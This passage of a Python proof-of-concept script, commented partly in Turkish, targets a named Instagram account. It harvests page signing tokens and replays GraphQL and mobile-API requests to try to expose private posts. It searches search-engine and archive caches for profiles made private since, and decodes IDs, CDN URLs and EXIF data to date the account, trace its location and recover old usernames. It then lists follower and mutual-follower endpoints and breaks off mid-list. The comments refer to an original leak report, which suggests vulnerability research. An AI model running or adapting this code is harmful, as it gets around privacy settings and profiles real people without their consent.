        r = requests.get(cdx_url, headers=headers, proxies=proxies, timeout=30)
        if r.status_code == 200 and r.text.strip().startswith('['):
            rows = json.loads(r.text)
            if len(rows) > 1:
                snapshots = []
                for row in rows[1:11]:          
                    snapshots.append({
                        'timestamp': row[1],
                        'original_url': row[2],
                        'mime': row[3],
                        'status': row[4],
                        'wayback_url': (f'https://web.archive.org/web/'
                                          f'{row[1]}/{row[2]}'),
                    })
                out['snapshot_count'] = len(rows) - 1
                out['snapshots_sample'] = snapshots
                                                   
                out['first_seen_ts'] = rows[1][1]
                out['last_seen_ts'] = rows[-1][1]
    except Exception as e:
        out['cdx_error'] = type(e).__name__

                                              
    pk_cdx = (f'https://web.archive.org/cdx/search/cdx?url=*.instagram.com/'
                f'*&filter=urlkey:.*{target_pk}.*&output=json&limit=20')
    try:
        r2 = requests.get(pk_cdx, headers=headers, proxies=proxies, timeout=30)
        if r2.status_code == 200 and r2.text.strip().startswith('['):
            rows2 = json.loads(r2.text)
            if len(rows2) > 1:
                                                                       
                old_usernames = set()
                for row in rows2[1:]:
                    orig = row[2]
                    m = re.search(r'instagram\.com/([a-zA-Z0-9._]+)/?', orig)
                    if m:
                        un = m.group(1)
                        if un.lower() != target_username.lower():
                            old_usernames.add(un)
                if old_usernames:
                    out['historical_usernames'] = sorted(old_usernames)
    except Exception:
        pass

    return out or None


def run_offline_forensics(target_username, target_pk, cookies, save, proxies):
    """Phase 25: API request YAPMAZ (Wayback dışında). critical_intel.json'ı
    okur, içindeki ham veriyi UI'de görünmeyen alanlara decode eder."""
    intel_path = os.path.join(ARTIFACT_ROOT, target_username,
                                'critical_intel.json')
    if not os.path.exists(intel_path):
        print(f"  [-] critical_intel.json yok: {intel_path}")
        print(f"      Önce ana run'ı koş (Phase 14 oluşturur)")
        return [], None

    with open(intel_path, encoding='utf-8') as f:
        intel = json.load(f)

    out = {
        'target_pk': str(target_pk),
        'target_username': target_username,
        'forensics': {},
    }

                                    
    print(f"  [1] SNOWFLAKE ID DECODE")
    sf = {}
    ident = intel.get('identity') or {}
    cp = intel.get('cross_platform') or {}

                                       
    ppid = ident.get('profile_pic_id')
    if ppid:
                                                             
        num_id = str(ppid).split('_')[0]
        ts_ms = snowflake_decode(num_id)
        if ts_ms:
            import datetime
            try:
                dt = datetime.datetime.fromtimestamp(ts_ms / 1000,
                                                       tz=datetime.timezone.utc)
                sf['avatar_upload_ts_ms'] = ts_ms
                sf['avatar_upload_iso'] = dt.isoformat()
                sf['avatar_age_days'] = (
                    datetime.datetime.now(datetime.timezone.utc) - dt).days
                print(f"      avatar yükleme: {sf['avatar_upload_iso']} "
                      f"({sf['avatar_age_days']} gün önce)")
            except (ValueError, OSError):
                pass

                                          
    fbid = cp.get('fbid_v2_facebook_id') or ident.get('fbid_v2')
    if fbid:
        ts_ms = snowflake_decode(fbid)
        if ts_ms:
            import datetime
            try:
                dt = datetime.datetime.fromtimestamp(ts_ms / 1000,
                                                       tz=datetime.timezone.utc)
                sf['fbid_v2_creation_iso'] = dt.isoformat()
                print(f"      fbid_v2 oluşturma: {sf['fbid_v2_creation_iso']}")
            except (ValueError, OSError):
                pass

                                                   
    mid = cp.get('messenger_interop_id')
    if mid:
        ts_ms = snowflake_decode(mid)
        if ts_ms:
            import datetime
            try:
                dt = datetime.datetime.fromtimestamp(ts_ms / 1000,
                                                       tz=datetime.timezone.utc)
                sf['messenger_interop_creation_iso'] = dt.isoformat()
                print(f"      Messenger interop_id ts: "
                      f"{sf['messenger_interop_creation_iso']}")
            except (ValueError, OSError):
                pass

                                      
    ig_pk = ident.get('pk')
    if ig_pk:
        try:
            pk_int = int(ig_pk)
                                                                  
                                                                       
                            
            sf['ig_pk_size'] = pk_int
            if pk_int < 1e9:
                sf['ig_pk_era'] = 'pre-2013 (early adopter)'
            elif pk_int < 5e9:
                sf['ig_pk_era'] = '2013-2015'
            elif pk_int < 5e10:
                sf['ig_pk_era'] = '2016-2020'
            else:
                sf['ig_pk_era'] = '2021+'
            print(f"      IG pk era: {sf['ig_pk_era']}")
        except (ValueError, TypeError):
            pass

    out['forensics']['snowflake_decode'] = sf

                                  
    print()
    print(f"  [2] CDN URL DECODE (geo + cluster + content age)")
    cdn_intel = []
    pp = intel.get('profile_pictures') or {}
    urls_to_parse = []
    if pp.get('profile_pic_url'):
        urls_to_parse.append(('profile_pic', pp['profile_pic_url']))
    hd_info = pp.get('hd_profile_pic_url_info') or {}
    if hd_info.get('url'):
        urls_to_parse.append(('hd_profile_pic', hd_info['url']))
    for v in (pp.get('hd_profile_pic_versions') or []):
        if v.get('url'):
            urls_to_parse.append((f'hd_v_{v.get("width")}', v['url']))

    for label, url in urls_to_parse[:5]:
        decoded = parse_cdn_url(url)
        if decoded:
            cdn_intel.append({'label': label, 'decoded': decoded})
            print(f"      [{label}] edge={decoded.get('cdn_edge_city')} "
                  f"cluster={decoded.get('qs__nc_cat', '-')} "
                  f"upload≈{decoded.get('cdn_upload_approx_iso','-')[:10]}")
    out['forensics']['cdn_url_decode'] = cdn_intel

                                  
    print()
    print(f"  [3] BIO LINK CLICK_ID DECODE")
    pc = intel.get('profile_content') or {}
    bio_links_intel = []
    for bl in (pc.get('bio_links') or []):
        click_id = bl.get('click_id')
        if click_id:
            decoded = parse_bio_click_id(click_id)
            if decoded:
                bio_links_intel.append({
                    'url': bl.get('url'),
                    'decoded': decoded,
                })
                print(f"      [{bl.get('url')[:40]}] "
                      f"aem_session={decoded.get('aem_session_id', '-')[:30]}")
    out['forensics']['bio_link_click_id'] = bio_links_intel

                                              
    print()
    print(f"  [4] XMT TOKEN DECODE (Meta cross-app)")
    threads_url = cp.get('threads_profile_glyph_url')
    xmt = parse_xmt_token(threads_url)
    if xmt:
        out['forensics']['xmt_token'] = xmt
        print(f"      xmt format: {xmt.get('xmt_format_version', '-')} "
              f"length={xmt.get('xmt_length')}")
        if xmt.get('xmt_extracted_id'):
            print(f"      xmt extracted internal id: "
                  f"{xmt['xmt_extracted_id']}")

                                           
    print()
    print(f"  [5] PROFILE PIC HASH + EXIF CHECK")
    if pp.get('profile_pic_url') or hd_info.get('url'):
        target_url = hd_info.get('url') or pp.get('profile_pic_url')
        save_dir = os.path.join(ARTIFACT_ROOT, target_username)
        os.makedirs(save_dir, exist_ok=True)
        save_path = os.path.join(save_dir, 'profile_pic.jpg') if save else None
        hash_intel = hash_profile_pic(target_url, proxies, save_path)
        if hash_intel:
            out['forensics']['profile_pic_hash'] = hash_intel
            print(f"      sha256={hash_intel.get('sha256', '-')[:32]}...")
            print(f"      size={hash_intel.get('size_bytes')}B  "
                  f"dim={hash_intel.get('real_dimensions', '-')}")
            if hash_intel.get('exif_present'):
                print(f"      *** EXIF DATA RETAINED: "
                      f"{list((hash_intel.get('exif_data') or {}).keys())[:5]}")
            if hash_intel.get('saved_to'):
                rel = os.path.relpath(hash_intel['saved_to'],
                                        os.path.dirname(
                                            os.path.abspath(__file__)))
                print(f"      saved -> {rel}")

                                       
    print()
    print(f"  [6] WAYBACK MACHINE — historical username + snapshots")
    wb = probe_wayback_for_pk(target_pk, target_username, proxies)
    if wb:
        out['forensics']['wayback'] = wb
        if wb.get('snapshot_count'):
            print(f"      {wb['snapshot_count']} snapshot")
            print(f"      ilk: {wb.get('first_seen_ts','-')[:8]}  "
                  f"son: {wb.get('last_seen_ts','-')[:8]}")
        if wb.get('historical_usernames'):
            print(f"      *** HISTORICAL USERNAMES (eski): "
                  f"{wb['historical_usernames']}")

                  
    out_path = os.path.join(ARTIFACT_ROOT, target_username,
                              'offline_forensics.json')
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(out, f, indent=2, ensure_ascii=False)

    print()
    print(f"  [+] OFFLINE FORENSICS SUMMARY:")
    sf = out['forensics'].get('snowflake_decode') or {}
    cdn = out['forensics'].get('cdn_url_decode') or []
    if sf.get('avatar_upload_iso'):
        print(f"      avatar_upload_iso     = {sf['avatar_upload_iso']}")
        print(f"      avatar_age_days       = {sf.get('avatar_age_days')}")
    if sf.get('fbid_v2_creation_iso'):
        print(f"      fbid_v2_creation_iso  = {sf['fbid_v2_creation_iso']}")
    if sf.get('messenger_interop_creation_iso'):
        print(f"      messenger_interop_iso = "
              f"{sf['messenger_interop_creation_iso']}")
    if sf.get('ig_pk_era'):
        print(f"      ig_pk_era             = {sf['ig_pk_era']}")
    if cdn:
        c0 = cdn[0]['decoded']
        print(f"      cdn_edge_city         = {c0.get('cdn_edge_city')}")
        print(f"      cdn_cluster_region    = "
              f"{c0.get('cluster_region_hint','-')}")
        print(f"      cdn_upload_approx     = "
              f"{c0.get('cdn_upload_approx_iso','-')}")
    pp_hash = out['forensics'].get('profile_pic_hash') or {}
    if pp_hash.get('sha256'):
        print(f"      profile_pic_sha256    = {pp_hash['sha256']}")
        print(f"      real_dimensions       = "
              f"{pp_hash.get('real_dimensions','-')}")
    wb = out['forensics'].get('wayback') or {}
    if wb.get('historical_usernames'):
        print(f"      historical_usernames  = "
              f"{wb['historical_usernames']}")
    if wb.get('snapshot_count'):
        print(f"      wayback_snapshots     = {wb['snapshot_count']} "
              f"(ilk: {wb.get('first_seen_ts','')[:8]})")

    rel = os.path.relpath(out_path, os.path.dirname(os.path.abspath(__file__)))
    print(f"  saved -> {rel}")
    return [], None


USER_ID_ENDPOINTS = [
                                                                              
                                                                
    ('user_info',       '/api/v1/users/{uid}/info/'),
    ('user_v1',         '/api/v1/users/{uid}/'),
    ('feed_user_byid',  '/api/v1/feed/user/{uid}/?count=12'),
    ('highlights_tray', '/api/v1/highlights/{uid}/highlights_tray/'),
    ('reels_media',     '/api/v1/feed/reels_media/?reel_ids={uid}'),
    ('user_friendship', '/api/v1/friendships/show/{uid}/'),
    ('clips_user',      '/api/v1/clips/user/?target_user_id={uid}&page_size=12'),
                                                                            
                                                                           
                                                   
    ('story_feed',      '/api/v1/feed/user/{uid}/story/'),
    ('reel_media',      '/api/v1/feed/user/{uid}/reel_media/'),
    ('shopping_user',   '/api/v1/commerce/destination/fetchable_tabs/?usernames={uid}'),
]


def extract_user_id_from_response(text):
                                                                                  
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        data = None
    if isinstance(data, dict):
        user = data.get('data', {}).get('user') if 'data' in data else None
        if isinstance(user, dict) and user.get('id'):
            return str(user['id'])
        if data.get('user', {}).get('pk'):
            return str(data['user']['pk'])
                                                                             
                                                                       
    m = re.search(r'xig_user_by_igid_v2[^{]*\{[^}]*"id"\s*:\s*"(\d+)"', text)
    if m:
        return m.group(1)
    return None


def extract_user_ids(text):
    """IG identifies users with TWO numeric forms: `pk` (short, ~10 digits,
    used by older mobile-API and some GraphQL queries) and `id` (long,
    17-19 digits prefixed 17841..., used by polaris GraphQL). Different
    queries take different forms; collect both."""
    out = {}
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        data = None
    if isinstance(data, dict):
        u = (data.get('data', {}).get('user')
             or data.get('user')
             or data.get('graphql', {}).get('user'))
        if isinstance(u, dict):
            for k in ('pk', 'pk_id', 'id', 'fbid', 'fbid_v2'):
                if u.get(k):
                    out[k] = str(u[k])
                                                                            
    m = re.search(r'profilePage_(\d+)', text)
    if m:
        out.setdefault('pk', m.group(1))
    m = re.search(r'xig_user_by_igid_v2[^{]*\{[^}]*"id"\s*:\s*"(\d+)"', text)
    if m:
        out.setdefault('id', m.group(1))
    m = re.search(r'"profile_id"\s*:\s*"(\d+)"', text)
    if m:
        out.setdefault('pk', m.group(1))
    return out


def extract_session_tokens(text):
    """Pulls the request-signing tokens IG embeds in every HTML response.
    Real authenticated GraphQL POSTs need these; without them /graphql/query/
    returns 400/403. The same set of tokens that poc_improved.py extracts
    via get_dynamic_tokens(), expanded:
        lsd        — short-lived per-request signing token
        fb_dtsg    — facebook design system token (required for write ops)
        jazoest    — fb_dtsg-derived integrity field
        rev        — AJAX bundle revision (X-Instagram-AJAX)
        hsi        — haste session id
        spin_t     — server load-balancing token
        doc_ids    — every numeric doc_id baked into the page
    """
    def find1(pat, default=None):
        m = re.search(pat, text)
        return m.group(1) if m else default

    return {
        'lsd':     find1(r'"LSD"\s*,\s*\[\]\s*,\s*\{\s*"token"\s*:\s*"([^"]+)"'),
        'fb_dtsg': find1(r'"DTSGInitialData"\s*,\s*\[\]\s*,\s*\{\s*"token"\s*:\s*"([^"]+)"'),
        'jazoest': find1(r'jazoest=([0-9]+)'),
        'rev':     find1(r'"rev"\s*:\s*(\d+)'),
        'hsi':     find1(r'"hsi"\s*:\s*"(\d+)"'),
        'spin_t':  find1(r'"spin_t"\s*:\s*(\d+)'),
        'app_id':  find1(r'"appId"\s*:\s*"(\d+)"'),
        'doc_ids': sorted(set(re.findall(r'"doc_id"\s*:\s*"(\d+)"', text))),
        'haste_response_ids': sorted(set(re.findall(
            r'adp_(\w+RelayPreloader)_(\w+)', text)))[:5],
    }


                                                                          
                                                                          
                                                                           
                                                             
KNOWN_DOC_IDS = [
    ('PolarisProfilePostsTabQuery',
     '69cba403172132360e027477c75113b2'),                                     
    ('PolarisProfilePostsTabContentQuery_connection',
     '8616647178463450'),
    ('PolarisProfilePostsLoggedOutTabContentQuery',
     '7553761371396480'),
    ('PolarisProfilePostsTabContentDirectQuery_connection',
     '7274538449353069'),
    ('PolarisProfileReelsTabContentQuery_connection',
     '8645213985574502'),
]


def variable_shapes(uids, target_username):
    """Each Polaris query takes a different argument schema. Without the GraphQL
    schema we try the four common shapes."""
    pk = uids.get('pk', '')
    long_id = uids.get('id', '') or pk
    return [
        ('id_first',       {'id': pk, 'first': 12}),
        ('user_id_first',  {'user_id': pk, 'first': 12}),
        ('long_id_first',  {'id': long_id, 'first': 12}),
        ('data_render_surface',
            {'data': {'count': 12, 'include_relationship_info': True,
                       'latest_besties_reel_media': True,
                       'latest_reel_media': True},
             'username': target_username, 'first': 12,
             'render_surface': 'PROFILE'}),
    ]


def extract_cohort_profile(text):
    """Pulls the privacy/cohort-relevant fields out of a web_profile_info
    response so we can compare the target against the cohort that did and did
    not trigger the leak in the original report."""
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    user = data.get('data', {}).get('user') if isinstance(data, dict) else None
    if not isinstance(user, dict):
        return None
    follower = user.get('edge_followed_by') or {}
    media = user.get('edge_owner_to_timeline_media') or {}
    return {
        'pk': user.get('id') or user.get('pk'),
        'username': user.get('username'),
        'full_name': user.get('full_name'),
        'is_private': user.get('is_private'),
        'is_verified': user.get('is_verified'),
        'is_business_account': user.get('is_business_account'),
        'is_professional_account': user.get('is_professional_account'),
        'follower_count': follower.get('count') if isinstance(follower, dict) else None,
        'media_count': media.get('count') if isinstance(media, dict) else None,
        'has_public_email': bool(user.get('public_email')),
        'has_public_phone': bool(user.get('public_phone_number')
                                  or user.get('contact_phone_number')),
        'biography_len': len(user.get('biography') or ''),
        'has_external_url': bool(user.get('external_url')),
        'category': user.get('category_name') or user.get('category'),
    }


def cohort_likelihood(profile):
    """Compares the target's profile against the cohort split observed in the
    original report (network_logs_and_samples/). Vulnerable accounts in that
    set were old, organic, no 2FA flags, with linked email; non-vulnerable
    were either Meta test accounts, brand-new (Oct 2025), or missing the
    email/age signals. Returns a (label, reasons) tuple — purely heuristic;
    does NOT predict whether IG's gating actually applies."""
    if not profile:
        return ('unknown', ['no web_profile_info data extracted'])

    reasons = []
    score = 0

    if profile['follower_count'] is not None:
        if profile['follower_count'] >= 100:
            score += 1
            reasons.append(f"organic-ish: followers={profile['follower_count']}")
        elif profile['follower_count'] < 20:
            score -= 1
            reasons.append(f"too small ({profile['follower_count']} followers) — looks new/test")

    if profile['media_count'] is not None:
        if profile['media_count'] >= 30:
            score += 1
            reasons.append(f"established: posts={profile['media_count']}")
        elif profile['media_count'] < 5:
            score -= 1
            reasons.append(f"sparse posts={profile['media_count']} — low cohort match")

    if profile['biography_len'] >= 20:
        score += 1
        reasons.append(f"populated bio ({profile['biography_len']} chars)")

    if profile['is_business_account'] or profile['is_professional_account']:
        score -= 1
        reasons.append("business/professional — different render path")

    if profile['is_verified']:
        score -= 1
        reasons.append("verified — Meta-internal flag, different gating")

    if score >= 2:
        return ('cohort_match', reasons)
    if score <= -1:
        return ('cohort_mismatch', reasons)
    return ('cohort_uncertain', reasons)


def print_cohort_report(probes):
    """If any web_profile_info probe succeeded, print a cohort summary."""
    for p in probes:
        if p['kind'] != 'api_web_profile_info':
            continue
        prof = extract_cohort_profile(p['response'].text)
        if not prof:
            continue
        label, reasons = cohort_likelihood(prof)
        print(f"  pk={prof['pk']} username=@{prof['username']} "
              f"full_name={prof['full_name']!r}")
        print(f"  is_private={prof['is_private']}  is_verified={prof['is_verified']}  "
              f"business={prof['is_business_account']}  pro={prof['is_professional_account']}")
        print(f"  followers={prof['follower_count']}  posts={prof['media_count']}  "
              f"bio={prof['biography_len']}ch  email_public={prof['has_public_email']}  "
              f"phone_public={prof['has_public_phone']}")
        print(f"  category={prof['category']!r}  external_url={prof['has_external_url']}")
        print(f"  cohort heuristic: {label}")
        for r in reasons:
            print(f"    - {r}")
        print(f"  reminder: {COHORT_NOTE}")
        return prof
    print("  (no web_profile_info response was parsed; cannot profile target)")
    return None


GRAPHQL_QUERY_NAMES = [
                                                                           
                                                                             
                                                                            
                                                     
    'PolarisProfilePostsTabContentQuery_connection',
    'PolarisProfilePostsTabContentDirectQuery_connection',
    'PolarisProfilePostsLoggedOutTabContentQuery',
    'PolarisProfileReelsTabContentQuery_connection',
    'PolarisProfileTaggedPostsTabContentQuery_connection',
]


def probe_graphql_token(query_name, doc_id, variables, target_username,
                         variant, tokens, cookies=None, save=False, proxies=None,
                         shape_label='vars'):
    """Replays /graphql/query/ with the FULL signing-token set the real web
    client uses: lsd, fb_dtsg, jazoest, X-Instagram-AJAX, X-FB-LSD plus the
    chosen doc_id and variables. This is the methodology in poc_improved.py;
    Phase 5's earlier 403 responses were caused by missing these tokens."""
    url = "https://www.instagram.com/graphql/query/"
    headers = build_headers(variant)
    headers.update({
        'x-ig-app-id':       IG_WEB_APP_ID,
        'x-asbd-id':         '129477',
        'x-fb-friendly-name': query_name,
        'x-fb-lsd':          tokens.get('lsd') or '',
        'x-instagram-ajax':  tokens.get('rev') or '1012650886',
        'x-requested-with':  'XMLHttpRequest',
        'accept':            '*/*',
        'content-type':      'application/x-www-form-urlencoded',
        'origin':            'https://www.instagram.com',
        'sec-fetch-dest':    'empty',
        'sec-fetch-mode':    'cors',
        'sec-fetch-site':    'same-origin',
        'referer':           f'https://www.instagram.com/{target_username}/',
    })
    if cookies:
        headers['x-csrftoken'] = cookies['csrftoken']

    body = {
        'av':                       (cookies or {}).get('ds_user_id', '0'),
        'lsd':                      tokens.get('lsd') or '',
        'jazoest':                  tokens.get('jazoest') or '',
        'fb_dtsg':                  tokens.get('fb_dtsg') or '',
        '__a':                      '1',
        '__d':                      'www',
        '__user':                   '0',
        '__req':                    '1',
        '__hs':                     tokens.get('hsi') or '',
        'dpr':                      '1',
        '__ccg':                    'EXCELLENT',
        '__rev':                    tokens.get('rev') or '',
        '__s':                      '::',
        '__hsi':                    tokens.get('hsi') or '',
        'fb_api_caller_class':      'RelayModern',
        'fb_api_req_friendly_name': query_name,
        'variables':                json.dumps(variables, separators=(',', ':')),
        'server_timestamps':        'true',
        'doc_id':                   doc_id or '',
    }

    r = requests.post(url, headers=headers, cookies=cookies, data=body,
                      proxies=proxies, timeout=30)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    short_qn = query_name.replace('PolarisProfile', 'PP').replace('Query', 'Q')[:32]
    short_did = (doc_id or 'no-doc')[:8]
    label = f"{variant['name']}__gql_{short_qn}_{short_did}_{shape_label}"
    if cookies:
        label += '__auth'
    if save:
        save_artifact(target_username, label, r.text, 'json')
    return {
        'kind': 'graphql_token',
        'url': url,
        'label': label[:78],
        'sig': sig,
        'scan': scan,
        'response': r,
    }


def fetch_session_tokens(target_username, variant, cookies, proxies):
    """Warms a fresh request to the profile HTML, harvests tokens + uids
    from the response. Same approach poc_improved.py uses."""
    url = f'https://www.instagram.com/{target_username}/'
    headers = build_headers(variant)
    if cookies:
        headers['x-csrftoken'] = cookies['csrftoken']
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, timeout=30)
    return r, extract_session_tokens(r.text), extract_user_ids(r.text)


def run_graphql_probes(target_username, user_id, cookies, stop_on_first,
                        save, proxies=None):
    """Phase 5/6: token-based GraphQL replay across known doc_ids and variable
    shapes. Uses ONE warmup HTML fetch to harvest LSD/AJAX/fb_dtsg, then fans
    out POSTs to /graphql/query/ with proper tokens."""
    probes = []
    first_hit = None
    auth_label = '[auth]' if cookies else '[unauth]'
    selected = [v for v in HEADER_VARIANTS if v.get('mobile')][:1]

                                                               
    warm_variant = selected[0]
    _, tokens, uids = fetch_session_tokens(target_username, warm_variant, cookies, proxies)
    if user_id and 'id' not in uids:
        uids['id'] = user_id
    print(f"  [warmup] tokens: lsd={'OK' if tokens['lsd'] else 'MISS'}  "
          f"fb_dtsg={'OK' if tokens['fb_dtsg'] else 'MISS'}  "
          f"rev={tokens['rev']}  doc_ids_in_html={len(tokens['doc_ids'])}  "
          f"uids={uids}")

                                             
    pairs = list(KNOWN_DOC_IDS)
    for did in tokens['doc_ids'][:3]:
        pairs.append(('discovered', did))

    shapes = variable_shapes(uids, target_username)

    for variant in selected:
        for query_name, doc_id in pairs:
            for shape_label, vars_ in shapes:
                p = probe_graphql_token(query_name, doc_id, vars_, target_username,
                                         variant, tokens, cookies, save, proxies,
                                         shape_label)
                probes.append(p)
                print(f"  [{auth_label} {p['label']:<78}] "
                      f"HTTP {p['sig']['status']} {p['sig']['bytes']:>5} B | "
                      f"{fmt_scan(p['scan'])}")
                if p['scan']['real_hit'] and not first_hit:
                    first_hit = p
                    if stop_on_first:
                        return probes, first_hit
                time.sleep(0.25)

    return probes, first_hit


                                                                                     

def probe_mobile_host(target_username, variant, cookies=None, save=False, proxies=None):
    """i.instagram.com is the mobile-API host. Different edge stack from
    www.instagram.com — historically had different gating policies."""
    url = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={target_username}'
    headers = build_headers(variant)
    headers.update({
        'x-ig-app-id': IG_MOBILE_APP_ID,
        'x-ig-capabilities': '3brTvw==',
        'x-ig-connection-type': 'WIFI',
        'x-asbd-id': '129477',
        'accept': '*/*',
        'host': 'i.instagram.com',
    })
    if cookies:
        headers['x-csrftoken'] = cookies['csrftoken']
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, timeout=30)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    label = f"{variant['name']}__mobile_host_web_profile_info"
    if cookies: label += '__auth'
    if save: save_artifact(target_username, label, r.text, 'json')
    return {'kind': 'mobile_host', 'url': url, 'label': label, 'sig': sig,
            'scan': scan, 'response': r}


def probe_oembed(target_username, variant, save=False, proxies=None):
    """oEmbed API: returns thumbnail/title/author. Different surface entirely."""
    url = f'https://api.instagram.com/oembed/?url=https%3A%2F%2Fwww.instagram.com%2F{target_username}%2F'
    headers = build_headers(variant)
    headers['accept'] = 'application/json,text/javascript,*/*;q=0.01'
    r = requests.get(url, headers=headers, proxies=proxies, timeout=15)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    label = f"{variant['name']}__oembed"
    if save: save_artifact(target_username, label, r.text, 'json')
    return {'kind': 'oembed', 'url': url, 'label': label, 'sig': sig,
            'scan': scan, 'response': r}


def _wayback_get(url, proxies=None, max_retries=3):
    """Wayback CDX is rate-limited (HTTP 429). Retry with exponential backoff.
    Also try the alt host `https://web.archive.org` if the http one 429s."""
    headers = {'user-agent': 'Mozilla/5.0 (compatible; poc-v3)',
               'accept': 'application/json,text/html;q=0.9,*/*;q=0.5'}
    for attempt in range(max_retries):
        try:
            r = requests.get(url, headers=headers, proxies=proxies, timeout=45)
            if r.status_code != 429:
                return r
            time.sleep(2 ** attempt + 1)
        except Exception:
            time.sleep(2 ** attempt)
    return None


def probe_wayback(target_username, save=False, proxies=None):
    """Wayback Machine: web.archive.org indexes IG profiles. Snapshots from
    leak-active A-B-test windows or pre-private-toggle states preserve
    embedded post URLs. CDX is rate-limited; we retry + try multiple hosts."""
    probes = []
                                                                           
                                       
    rows = None
    for host in ('https://web.archive.org', 'http://web.archive.org'):
        cdx = (f'{host}/cdx/search/cdx?url=instagram.com/{target_username}/'
               '&output=json&limit=30&filter=statuscode:200&from=20180101')
        r0 = _wayback_get(cdx, proxies)
        if r0 is None:
            continue
        if r0.status_code == 200 and r0.text.strip().startswith('['):
            try:
                rows = json.loads(r0.text)
                break
            except json.JSONDecodeError:
                pass

    if not rows or len(rows) <= 1:
        if r0 is None:
            probes.append(_empty_probe('wayback', 'cdx',
                                         'wayback_cdx_unreachable', 'SSL/network'))
        else:
            probes.append({'kind': 'wayback', 'url': 'cdx',
                            'label': 'wayback_no_index',
                            'sig': response_signature(r0),
                            'scan': scan_markers(''), 'response': r0})
        return probes

                                                                              
    timestamps = [r[1] for r in rows[1:]]
    sample_idx = list({0, len(timestamps) // 3, 2 * len(timestamps) // 3,
                       len(timestamps) - 1, len(timestamps) - 2})
    sample_idx = [i for i in sample_idx if 0 <= i < len(timestamps)]
    for i in sample_idx[:4]:
        ts = timestamps[i]
        snap_url = (f'https://web.archive.org/web/{ts}/'
                    f'https://www.instagram.com/{target_username}/')
        r = _wayback_get(snap_url, proxies)
        if r is None or r.status_code != 200:
            continue
        sig = response_signature(r)
        scan = scan_markers(r.text)
        label = f'wayback_{ts}'
        if save:
            save_artifact(target_username, label, r.text, 'html')
        probes.append({'kind': 'wayback', 'url': snap_url, 'label': label,
                        'sig': sig, 'scan': scan, 'response': r})
        time.sleep(1.0)

    return probes


def probe_bing_cache(target_username, variant, save=False, proxies=None):
    """Bing's `cc.bingj.com` cache replaces Google's (deprecated Jan 2024).
    Bing indexes IG profiles aggressively and cached versions sometimes lag
    behind privacy toggles — a profile newly set to private may still have
    a cached public version on Bing for weeks."""
    url = f'https://cc.bingj.com/cache.aspx?q=instagram.com+{target_username}&d=4500000000000000'
    headers = build_headers(variant)
    headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                       '(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'referer': 'https://www.bing.com/',
    })
    try:
        r = requests.get(url, headers=headers, proxies=proxies, timeout=30,
                          allow_redirects=True)
    except Exception as e:
        return _empty_probe('bing_cache', url, f"{variant['name']}__bing_cache",
                              type(e).__name__)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    label = f"{variant['name']}__bing_cache"
    if save:
        save_artifact(target_username, label, r.text, 'html')
    return {'kind': 'bing_cache', 'url': url, 'label': label, 'sig': sig,
            'scan': scan, 'response': r}


def _empty_probe(kind, url, label, error=None):
    """Stub probe used when a remote endpoint is unreachable so the run
    surfaces the failure in the matrix rather than dropping it silently."""
    return {
        'kind': kind, 'url': url,
        'label': label + (f' (UNREACHABLE: {error})' if error else ''),
        'sig': {'status': 0, 'bytes': 0, 'x-fb-debug': '',
                 'content-encoding': '-', 'csp-nonce': '-', 'x-ig-app-id': '-'},
        'scan': scan_markers(''),
        'list_scan': scan_user_list_markers(''),
        'leaked_pks_estimate': 0,
        'response': None,
    }


def probe_archive_org_save(target_username, save=False, proxies=None):
    """archive.org's "Save Page Now" forces a fresh snapshot.  The save process
    proxies the request through their crawler IP (US datacenter) — different
    egress, different geo. Sometimes the saved HTML differs from what we get
    locally because of cohort/geo gating."""
    save_url = f'https://web.archive.org/save/https://www.instagram.com/{target_username}/'
    headers = {'user-agent': 'Mozilla/5.0 poc-v3', 'accept': 'text/html,*/*;q=0.8'}
    try:
        r = requests.get(save_url, headers=headers, proxies=proxies,
                          timeout=120, allow_redirects=True)
    except Exception as e:
        return _empty_probe('archive_save', save_url, 'archive_save_now',
                              type(e).__name__)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    label = f'archive_save_now'
    if save:
        save_artifact(target_username, label, r.text, 'html')
    return {'kind': 'archive_save', 'url': save_url, 'label': label,
            'sig': sig, 'scan': scan, 'response': r}


def probe_google_cache(target_username, variant, save=False, proxies=None):
    """Google's web cache mirrors page contents; if Google's bot caught the
    profile during a leaking window, the cache may still serve the leaked data."""
    url = (f'https://webcache.googleusercontent.com/search?q=cache:'
           f'www.instagram.com/{target_username}/')
    headers = build_headers(variant)
    headers.update({
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'referer': 'https://www.google.com/',
    })
    try:
        r = requests.get(url, headers=headers, proxies=proxies, timeout=30,
                          allow_redirects=True)
    except Exception as e:
        return None
    sig = response_signature(r)
    scan = scan_markers(r.text)
    label = f"{variant['name']}__google_cache"
    if save: save_artifact(target_username, label, r.text, 'html')
    return {'kind': 'google_cache', 'url': url, 'label': label, 'sig': sig,
            'scan': scan, 'response': r}


                                                                                   
                                                                             
                                                                           
                                                                       
                                                                        

SOCIAL_GRAPH_ENDPOINTS = [
                                                    
                                                                         
                                                                          
                                                              
    ('GET', '/api/v1/friendships/show/{pk}/',
     None, 'friendships_show'),
    ('POST', '/api/v1/friendships/show_many/',
     'user_ids={pk}', 'show_many_post'),
                                                                        
    ('GET', '/api/v1/friendships/{pk}/followers/?count=24'
            '&search_surface=follow_list_page',
     None, 'friendships_followers'),
    ('GET', '/api/v1/friendships/{pk}/following/?count=24'
            '&search_surface=follow_list_page',
     None, 'friendships_following'),
    ('GET', '/api/v1/friendships/{pk}/mutual_followers/',
     None, 'mutual_followers'),
                                                       
    ('GET',  '/api/v1/discover/chaining/?target_id={pk}'
